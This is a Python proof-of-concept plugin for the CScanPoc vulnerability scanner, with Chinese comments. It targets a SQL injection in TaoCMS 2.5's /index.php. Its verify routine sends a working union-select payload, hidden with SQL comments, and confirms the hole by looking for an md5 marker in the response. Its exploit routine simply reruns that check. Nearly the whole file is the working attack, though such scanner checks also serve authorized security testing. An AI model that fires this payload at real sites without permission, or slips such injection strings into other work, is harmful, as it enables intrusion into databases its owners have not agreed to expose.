# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'TaoCMS_0000'  # 平台漏洞编号，留空
    name = 'TaoCMS 2.5 /index.php SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-03-20'  # 漏洞公布时间
    desc = '''
        TaoCMS是一个完善支持多数据库(Sqlite/Mysql)的CMS网站内容管理系统，是国内最小巧的功能完善的基于 php+SQLite/php+Mysql的CMS。体积小速度快，所有的css、JavaScript均为手写代码，无任何垃圾代码，采用严格的数据过滤，保证服务器的安全稳定。
        TaoCMS 2.5 /index.php SQL注入漏洞
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-62606'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'TaoCMS'  # 漏洞应用名称
    product_version = '2.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '632f12a7-acc5-43df-9fe8-8d95be6af0e6'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = '{target}'.format(target=self.target)
            payload = "/index.php/*123*/'union/**/select/**/1,2,3,4,5,6,7,8,md5(3.1415),10,11%23&action=getatlbyid"
            target_url = url + payload
            code, head, body, _, _ = hh.http(target_url)
            if code == 200:
                if body and body.find('63e1f04640e83605c1d177544a5a0488') != -1:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
